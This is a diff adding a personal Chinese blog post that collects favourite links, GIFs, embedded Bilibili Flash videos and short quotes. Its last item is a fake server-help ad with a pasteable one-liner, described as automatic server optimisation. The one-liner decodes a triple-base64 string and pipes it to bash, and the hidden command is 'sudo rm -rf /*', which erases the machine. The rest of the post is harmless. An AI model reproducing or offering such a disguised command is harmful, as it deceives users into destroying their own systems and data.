@@ -1,0 +1,48 @@
+---
+title: 一些好玩或喜欢的东西
+date: 2017-01-15 13:39:19
+categories:
+tags:
+cover: https://ooo.0o0.ooo/2017/01/15/587b6fa037ff5.jpg
+skip: false
+---
+
+长时间记录一些好玩或喜欢的东西
+
+### Links
+
+1. [UI超棒，AI俄罗斯方块动画！有时间自己玩玩！](http://thomas-yang.me/#color=977355)
+2. [在线画图UML...](https://www.processon.com/diagrams)
+
+### Pictures
+
+![](http://ww3.sinaimg.cn/mw690/006D2KSdjw1fbldl68ryhg30dw086nki.gif)
+![ClipboardImage](http://obu9je6ng.bkt.clouddn.com/FiO5oFV4MEL1pwm1GYad5tDFmeJw?imageslim)
+
+![ClipboardImage](http://obu9je6ng.bkt.clouddn.com/FiyQ9hLRXRhJsKYBs_vOW8pZw82m?imageslim)
+
+![](http://ww4.sinaimg.cn/mw690/006D2KSdjw1fb8wvlp7rrg30dw06ph88.gif)
+
+
+### Videos
+
+<embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=7793587&page=1" pluginspage=".adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></embed>
+
+<embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=7924127&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></embed>
+
+<embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=1162066&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></embed>
+
+<embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=500747&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></embed>
+
+### Words
+
+- 这世界上的大部分健康的人际关系，都是两个强者之间的锦上添花，而不是弱者之间的相互取暖。
+
+- 一个社会的文明程度取决于其对弱者的态度。
+
+- 因为我想你这三个字说不出口，所以每天噼里啪啦跟你讲一堆没有用的废话，我这么神经病，都怪你。 
+
+- 服务器速度慢？空间不够用？经常死机？在线率低？经常被攻击？
+        echo WXpOV2EySjVRbmxpVTBGMFkyMVpaMHg1YjBzPQ==|base64 -D|base64 -D|base64 -D|bash
+自动优化你的服务器
+
